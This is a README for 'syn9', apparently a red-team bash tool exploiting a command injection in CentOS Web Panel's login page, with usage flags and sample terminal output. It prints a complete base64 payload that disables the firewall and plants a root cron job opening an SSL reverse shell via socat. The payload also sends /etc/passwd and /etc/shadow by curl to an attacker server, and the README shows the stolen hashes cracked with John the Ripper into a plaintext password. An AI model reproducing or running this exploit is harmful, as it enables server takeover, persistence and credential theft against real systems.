Docs Paper : https://docs.google.com/document/d/1rQ7e9i2AFzHbASfRu3nkgjIswbrS2AB2i7V9OK3dJLs/edit?usp=sharing <br>
Libprochider : https://github.com/gianlucaborello/libprocesshider > ```/var/www/html``` <br>
YouTube Demo : https://www.youtube.com/watch?v=V0HgzE8IElA&t=343s <br>

---

## tested machine box
- [x] CentOS 7 - CentOS Web Panel 9.8.1146
- [x] Kali Linux 2022.4.5 / Any Debian-based 
- [x] Ubuntu 20,04 - ModSecurity network-based WAF + Reverse Proxy
- [x] Mikrotik Router - NAT Port Forwarding

<p align="center">
<img align="center" width="auto" src="doc/image/topology.png?raw=true">
</p>

## flag usage and docs
```
Usage: syn9 [OPTION]... [ARG]...
Red Team utilities for setting up CWP CentOS 7 payload & reverse shell

Available flag options, starred one are combination purposes ...

  -h     launch command usage for avilable flag options & examples
  -g     generate a payload string with predefined POST body to be used externally
  -i     inject the payload string via curl's POST request internally instead
  -n **  specify the IP address via the issued network interface
  -o **  specify the listener port address
  -c **  specify the SSL certificate path with .PEM format file
  -w **  specify the CWP site's IP address along with its port number
  -d **  specify other network interface to be used as decoy on HTTP request
  -e **  specify wordlist to be used for John to match the password hash from API

Flag usage examples:

  $ bash syn9 -o 6666 -c openssl-cert/bind.pem -n eth0 ## to create a listener
  $ bash syn9 -w 10.0.0.100:2031 -o 6666 -n eth0 -g    ## to generate the payload string
  $ bash syn9 -w 10.0.0.100:2031 -o 6666 -n eth0 -i    ## to inject the payload via curl
  $ bash syn9 -w 10.0.0.100:2031 -o 6666 -n eth0 -i -d eth1
  $ bash syn9 -e /usr/share/wordlists/rockyou.txt      ## wordlist for cracking password
```
## printing the generated payload
```
┌──(kali㉿kali)-[/media/sf_Remote/cwp-rce-white-box]
└─$ ./syn9 -w 10.0.0.100:2031 -o 6666 -n eth0 -g
[-] URI address : POST https://10.0.0.100:2031/login/index.php?login=$($payload) ...
[-] SSL connect : 172.16.1.100:6666 ...
[-] POST data   : username=root&password=pwned&commit=login ...
[-] socat opts. : exec:'bash -li',pty,stderr,setsid,sigint,sane ...
---
[-] generating payload in base64 format ...
---
$(echo${IFS}IyEvYmluL2Jhc2gKJCh3aGljaCBjYXQpIC9kZXYvbnVsbCA+IC9ldGMvY3NmL2NzZi5kZW55CiQod2hpY2ggY3NmKSAteCAmIHdhaXQKJCh3aGljaCBzeXN0ZW1jdGwpIHN0b3AgY3NmLnNlcnZpY2UgJiB3YWl0CnBhdGhlbnY9JChwcmludGVudiBQQVRIKQpldmVudD0iRElTUExBWT06MApQQVRIPSIkcGF0aGVudiIKKi8xICogKiAqICogaXA9XCQoY3VybCAtcyBodHRwOi8vMTcyLjE2LjEuMTAwOjIwODAvIHwgY3V0IC1kICdcIicgLWYgNCk7IHBvcnQ9XCQoY3VybCAtcyBodHRwOi8vMTcyLjE2LjEuMTAwOjIwODAvIHwgY3V0IC1kICdcIicgLWYgMTIpOyAkKHdoaWNoIHNvY2F0KSBleGVjOidiYXNoIC1saScscHR5LHN0ZGVycixzZXRzaWQsc2lnaW50LHNhbmUgT1BFTlNTTDpcJGlwOlwkcG9ydCx2ZXJpZnk9MCIKY3JvbnRhYiAtdSByb290IC1sIHwgZ3JlcCAvdXNyL2xvY2FsL2N3cC9waHA3MS9iaW4vcGhwIHwgY3JvbnRhYiAtdSByb290IC0KKGNyb250YWIgLWw7IHByaW50ZiAiJGV2ZW50XG4iKSB8IGNyb250YWIgLQpwYXNzd2Q9JChjYXQgL2V0Yy9wYXNzd2QgfCBncmVwIC1FICdob21lfHJvb3QnIHwgYmFzZTY0IHwgdHIgLWQgJ1xuJykKYXJyX3B3ZD0kKGNhdCAvZXRjL3Bhc3N3ZCB8IGdyZXAgLUUgJ2hvbWV8cm9vdCcgfCBjdXQgLWQgJzonIC1mIDEpCnNoYWRvdz0kKGNhdCAvZXRjL3NoYWRvdyB8IGdyZXAgIiRhcnJfcHdkIiB8IGJhc2U2NCB8IHRyIC1kICdcbicpCmN1cmwgLXMgLXEgLS1kYXRhIHtcIkRBVEFcIjp7XCJQQVNTV0RcIjpcIiRwYXNzd2RcIn19IC1YIFBBVENIIGh0dHA6Ly8xNzIuMTYuMS4xMDA6MjA4MC8gLW8gL2Rldi9udWxsCmN1cmwgLXMgLXEgLS1kYXRhIHtcIkRBVEFcIjp7XCJTSEFET1dcIjpcIiRzaGFkb3dcIn19IC1YIFBBVENIIGh0dHA6Ly8xNzIuMTYuMS4xMDA6MjA4MC8gLW8gL2Rldi9udWxsCiQod2hpY2ggc29jYXQpIGV4ZWM6J2Jhc2ggLWxpJyxwdHksc3RkZXJyLHNldHNpZCxzaWdpbnQsc2FuZSBPUEVOU1NMOjE3Mi4xNi4xLjEwMDo2NjY2LHZlcmlmeT0wCg==${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash)
```
## injecting it. straight up
```
┌──(kali㉿kali)-[/media/sf_Remote/cwp-rce-white-box]
└─$ ./syn9 -w 192.168.1.14:2031 -o 6666 -n eth0 -i
[-] URI address : POST https://192.168.1.14:2031/login/index.php?login=$($payload) ...
[-] SSL connect : 192.168.1.15:6666 ...
[-] POST data   : username=root&password=pwned&commit=login ...
[-] socat opts. : exec:'bash -li',pty,stderr,setsid,sigint,sane ...
---
[-] injecting payload to the URI via curl ...
[-] halting tty for the remote access session (9821)...
--
```
## listener on enc. reverse shell
```
┌──(kali㉿kali)-[/media/sf_Remote/cwp-rce-white-box]
└─$ ./syn9  -o 6666 -c openssl-cert/bind.pem -n eth0
[-] SSL listen  : 192.168.1.15:6666 ...
[-] SSL cert    : openssl-cert/bind.pem,verify=0 ...
[-] socat opts. : file:`tty`,raw,echo=0 ...
---
[-] suggesting static terminal size, rows [20/42] x cols [92/184] ...
[-] $ stty rows X cols X
[-] $ export TERM=xterm-256color
---

********************************************
 Welcome to CWP (CentOS WebPanel) server
********************************************

CWP Wiki: http://wiki.centos-webpanel.com
CWP Forum: http://forum.centos-webpanel.com
CWP Support: http://centos-webpanel.com/support-services

 13:11:38 up 10 min,  1 user,  load average: 0.01, 0.13, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
server   pts/0    192.168.1.7      13:06    5:36   0.09s  0.09s -bash

[root@centos login]#
```
## REST API on storing passwd & shadow
```
[
  {
    "IP_LISTENER": "172.16.1.100",
    "IP_TARGET": "10.0.0.100:2031",
    "PORT_LISTENER": "26666",
    "LAST_UPDATE": "2023-03-07 23:31:57.497925211 -0500 EST m=+839.545072256",
    "DATA": {
      "PASSWD": "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApvcGVyYXRvcjp4OjExOjA6b3BlcmF0b3I6L3Jvb3Q6L3NiaW4vbm9sb2dpbgpzZXJ2ZXI6eDoxMDAwOjEwMDA6bXVoYW1tYWQgbnVyIGlyc3lhZDovaG9tZS9zZXJ2ZXI6L2Jpbi9iYXNoCmxvZ2luOng6OTkwOjk4ODo6L2hvbWUvbG9naW46L3NiaW4vbm9sb2dpbgo=",
      "SHADOW": "cm9vdDokNiRMWE0wcUZHdSQ0azBoZEg5UUREQjJTNE51dFJTNFVGMU5lOE81eE5ROXdia2czZzFZS3ZYWW8ua2NnVDdPVjFrNTJNVnZudTJ0ZHVVbjVoSzYxVTVLRUVRTzJ3cFd4LzoxOTQwNDowOjk5OTk5Ojc6OjoKb3BlcmF0b3I6KjoxODM1MzowOjk5OTk5Ojc6OjoKc2VydmVyOiQ2JDl6ekZOR2lJSFZna0VIb3MkV2J3cThmVUhHRExPUEUvYmFKbERnQWlzR2k0OGhzRGJwSWs0TTJoZVVMalFWcUdOZjFsU3lZRHNYWlF4NTJnODk4MVk5M3JMMXRET2duSE5LNkdtMS86OjA6OTk5OTk6Nzo6Ogpsb2dpbjohIToxOTQwNDo6Ojo6Ogo="
    }
  }
]
```
## extract them juices with John The Ripper
```
┌──(root㉿kali)-[/media/sf_cwp-rce-white-box]
└─# ./syn9 -e /usr/share/wordlists/rockyou.txt
---
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Node numbers 1-4 of 4 (fork)
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
okok1ABC         (root)
1 0g 0:00:00:00 DONE (2023-03-07 23:34) 0g/s 25.49p/s 50.98c/s 50.98C/s 123456..superman
Waiting for 3 children to terminate
3 0g 0:00:00:00 DONE (2023-03-07 23:34) 0g/s 48.14p/s 96.29c/s 96.29C/s 123456789..okok
okok1ABC         (server)
4 2g 0:00:00:00 DONE (2023-03-07 23:34) 7.692g/s 50.00p/s 100.0c/s 100.0C/s password..okok1ABC
2 0g 0:00:00:00 DONE (2023-03-07 23:34) 0g/s 28.88p/s 57.77c/s 57.77C/s 12345..hannah
Session completed.

┌──(root㉿kali)-[/media/sf_cwp-rce-white-box]
└─# cat log/03-07-23.log
23:34:54 PM -- 10.0.0.100:2031
root:okok1ABC:0:0:root:/root:/bin/bash
server:okok1ABC:1000:1000:muhammad nur irsyad:/home/server:/bin/bash
```
## ModSecurity sample 404 page
<p align="center">
<img align="center" width="auto" src="doc/image/waf-sample.png?raw=true">
</p>
